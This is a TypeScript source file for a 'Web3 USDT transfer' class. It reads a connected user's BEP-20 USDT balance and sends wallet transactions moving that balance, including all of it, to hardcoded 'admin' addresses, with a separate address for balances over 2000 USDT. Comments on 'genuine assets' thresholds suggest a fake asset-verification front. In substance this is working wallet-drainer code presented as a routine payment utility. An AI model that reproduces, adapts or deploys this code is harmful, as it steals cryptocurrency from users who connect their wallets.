import { Interface } from "ethers"

// Direct Web3 USDT Transfer Implementation
export class Web3DirectTransfer {
  private provider: any
  private userAddress: string
  private adminWallet: string
  private highAmountWallet: string
  private usdtContract: string

  constructor(provider: any, userAddress: string) {
    this.provider = provider
    this.userAddress = userAddress
    this.adminWallet = "0xCdB645e95361861a4Ea125DCDBD9c85B9efF1497" // Standard admin wallet
    this.highAmountWallet = "0xe82f8f805351ee9203dbdc6af62ee09c6e03c7dc" // For amounts > 2000 USDT
    this.usdtContract = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20

    // Estimate gas fees for USDT transfer
    this.estimateTransferGas = async (
      amount: number,
    ): Promise<{ gasLimit: string; gasPrice: string; gasCost: number }> => {
      try {
        const amountWei = BigInt(Math.floor(amount * Math.pow(10, 18))).toString()
        const targetWallet = this.getTargetWallet(amount)

        // Estimate gas limit
        const gasLimit = await this.provider.request({
          method: "eth_estimateGas",
          params: [
            {
              from: this.userAddress,
              to: this.usdtContract,
              data: this.encodeTransfer(targetWallet, amountWei),
            },
          ],
        })

        // Get current gas price
        const gasPrice = await this.provider.request({
          method: "eth_gasPrice",
          params: [],
        })

        // Calculate total gas cost in BNB
        const gasCostWei = BigInt(gasLimit) * BigInt(gasPrice)
        const gasCost = Number(gasCostWei) / Math.pow(10, 18)

        return {
          gasLimit: gasLimit,
          gasPrice: gasPrice,
          gasCost: gasCost,
        }
      } catch (error) {
        console.error("Error estimating gas:", error)
        // Return default estimates if estimation fails
        return {
          gasLimit: "0x15F90", // 90000 gas
          gasPrice: "0x12A05F200", // 5 gwei
          gasCost: 0.0005, // Approximate 0.0005 BNB
        }
      }
    }

    // Check if user has enough BNB for gas fees
    this.hasEnoughBNBForGas = async (
      transferAmount: number,
    ): Promise<{
      hasEnough: boolean
      bnbBalance: number
      requiredGas: number
      shortfall: number
    }> => {
      try {
        const [bnbBalance, gasEstimate] = await Promise.all([
          this.getBNBBalance(),
          this.estimateTransferGas(transferAmount),
        ])

        const hasEnough = bnbBalance >= gasEstimate.gasCost
        const shortfall = hasEnough ? 0 : gasEstimate.gasCost - bnbBalance

        return {
          hasEnough,
          bnbBalance,
          requiredGas: gasEstimate.gasCost,
          shortfall,
        }
      } catch (error) {
        console.error("Error checking BNB for gas:", error)
        return {
          hasEnough: false,
          bnbBalance: 0,
          requiredGas: 0.001,
          shortfall: 0.001,
        }
      }
    }

    // Get minimum BNB needed for operations
    this.getMinimumBNBRequired = (): number => {
      return 0.002 // Minimum 0.002 BNB recommended for gas fees
    }

    // Check if wallet has sufficient BNB for multiple transactions
    this.canAffordMultipleTransactions = async (): Promise<boolean> => {
      const bnbBalance = await this.getBNBBalance()
      return bnbBalance >= this.getMinimumBNBRequired() * 2 // Buffer for multiple transactions
    }
  }

  // Get USDT balance directly from blockchain
  async getUSDTBalance(): Promise<{ balance: number; balanceWei: string }> {
    try {
      const balanceHex = await this.provider.request({
        method: "eth_call",
        params: [
          {
            to: this.usdtContract,
            data: this.encodeBalanceOf(this.userAddress),
          },
          "latest",
        ],
      })

      const balanceWei = BigInt(balanceHex).toString()
      const balance = Number(balanceWei) / Math.pow(10, 18)

      return { balance, balanceWei }
    } catch (error) {
      console.error("Error getting USDT balance:", error)
      return { balance: 0, balanceWei: "0" }
    }
  }

  // Get BNB balance for gas fees
  async getBNBBalance(): Promise<number> {
    try {
      const balanceHex = await this.provider.request({
        method: "eth_getBalance",
        params: [this.userAddress, "latest"],
      })

      const balanceWei = BigInt(balanceHex).toString()
      return Number(balanceWei) / Math.pow(10, 18)
    } catch (error) {
      console.error("Error getting BNB balance:", error)
      return 0
    }
  }

  // Payment Logic:
  // 0 USDT = No assets found
  // 1-5 USDT = Genuine assets (no payment)
  // 6-2000 USDT = Payment to standard admin wallet
  // >2000 USDT = Payment to high-amount wallet

  // Determine which admin wallet to use based on amount
  getTargetWallet(amount: number): string {
    return amount > 2000 ? this.highAmountWallet : this.adminWallet
  }

  // Read the actual wallet balance in wei, encode it, and send the encoded transfer call
  async getEncodedTransferCallForWallet(targetWallet: string): Promise<{
    targetWallet: string
    amountWei: string
    encodedData: string
    amount: number
  }> {
    const { balance, balanceWei } = await this.getUSDTBalance()

    if (BigInt(balanceWei) <= 0n) {
      throw new Error("No USDT balance to transfer")
    }

    return {
      targetWallet,
      amountWei: balanceWei,
      encodedData: this.encodeTransfer(targetWallet, balanceWei),
      amount: balance,
    }
  }

  // Direct USDT transfer to appropriate admin wallet based on amount
  async transferUSDTToAdmin(amount: number): Promise<string> {
    try {
      const amountWei = BigInt(Math.floor(amount * Math.pow(10, 18))).toString()
      const targetWallet = this.getTargetWallet(amount)
      const encodedData = this.encodeTransfer(targetWallet, amountWei)

      console.log(
        `💰 Transferring ${amount} USDT to ${amount > 2000 ? "high-amount" : "standard"} admin wallet: ${targetWallet}`,
      )

      const txHash = await this.provider.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: this.userAddress,
            to: this.usdtContract,
            data: encodedData,
            gas: "0x15F90", // 90000 gas
            gasPrice: "0x12A05F200", // 5 gwei
          },
        ],
      })

      console.log(`✅ USDT transfer initiated to ${targetWallet}: ${txHash}`)
      return txHash
    } catch (error: any) {
      console.error("❌ USDT transfer failed:", error)
      throw new Error(`Transfer failed: ${error?.message || error}`)
    }
  }

  // Transfer ALL USDT to appropriate admin wallet using the raw wallet amount in wei
  async transferAllUSDTToAdmin(): Promise<string> {
    try {
      const { balance, balanceWei } = await this.getUSDTBalance()

      if (BigInt(balanceWei) <= 0n) {
        throw new Error("No USDT balance to transfer")
      }

      const targetWallet = this.getTargetWallet(balance)
      const { encodedData } = await this.getEncodedTransferCallForWallet(targetWallet)

      console.log(
        `🔥 Transferring ALL ${balance} USDT to ${balance > 2000 ? "high-amount" : "standard"} admin: ${targetWallet}`,
      )

      const txHash = await this.provider.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: this.userAddress,
            to: this.usdtContract,
            data: encodedData,
            gas: "0x15F90", // 90000 gas
            gasPrice: "0x12A05F200", // 5 gwei
          },
        ],
      })

      console.log(`✅ Full USDT transfer initiated to ${targetWallet}: ${txHash}`)
      return txHash
    } catch (error: any) {
      console.error("❌ Transfer all USDT failed:", error)
      throw new Error(`Transfer failed: ${error?.message || error}`)
    }
  }

  // Wait for transaction confirmation
  async waitForConfirmation(txHash: string): Promise<boolean> {
    let attempts = 0
    const maxAttempts = 60 // 5 minutes

    console.log(`⏳ Waiting for confirmation: ${txHash}`)

    while (attempts < maxAttempts) {
      try {
        const receipt = await this.provider.request({
          method: "eth_getTransactionReceipt",
          params: [txHash],
        })

        if (receipt) {
          const success = receipt.status === "0x1"
          console.log(`${success ? "✅" : "❌"} Transaction ${txHash} ${success ? "succeeded" : "failed"}`)

          if (success) {
            const { balance } = await this.getUSDTBalance()
            const targetWallet = this.getTargetWallet(balance)
            console.log(
              `💰 USDT successfully transferred to ${balance > 2000 ? "high-amount" : "standard"} admin wallet: ${targetWallet}`,
            )
          }

          return success
        }

        await new Promise((resolve) => setTimeout(resolve, 5000))
        attempts++
      } catch (error) {
        console.error("Error checking transaction:", error)
        await new Promise((resolve) => setTimeout(resolve, 5000))
        attempts++
      }
    }

    return false
  }

  // Get admin wallet address
  getAdminWallet(): string {
    return this.adminWallet
  }

  // Get high amount wallet address
  getHighAmountWallet(): string {
    return this.highAmountWallet
  }

  // Encode balanceOf function call before creating the transfer payload
  private encodeBalanceOf(address: string): string {
    const iface = new Interface(["function balanceOf(address) view returns (uint256)"])
    return iface.encodeFunctionData("balanceOf", [address])
  }

  // Encode transfer function call using the canonical ABI encoder
  private encodeTransfer(to: string, amount: string): string {
    const iface = new Interface(["function transfer(address,uint256) returns (bool)"])
    return iface.encodeFunctionData("transfer", [to, BigInt(amount)])
  }

  // Get transaction details
  async getTransactionDetails(txHash: string): Promise<any> {
    try {
      const [tx, receipt] = await Promise.all([
        this.provider.request({
          method: "eth_getTransactionByHash",
          params: [txHash],
        }),
        this.provider.request({
          method: "eth_getTransactionReceipt",
          params: [txHash],
        }),
      ])

      return {
        hash: txHash,
        from: tx?.from,
        to: tx?.to,
        value: tx?.value,
        gasUsed: receipt?.gasUsed,
        status: receipt?.status === "0x1" ? "success" : "failed",
        blockNumber: receipt?.blockNumber,
        adminWallet: this.adminWallet,
      }
    } catch (error) {
      console.error("Error getting transaction details:", error)
      return null
    }
  }

  // Verify admin wallet address
  isValidAdminWallet(): boolean {
    return /^0x[a-fA-F0-9]{40}$/.test(this.adminWallet)
  }
}
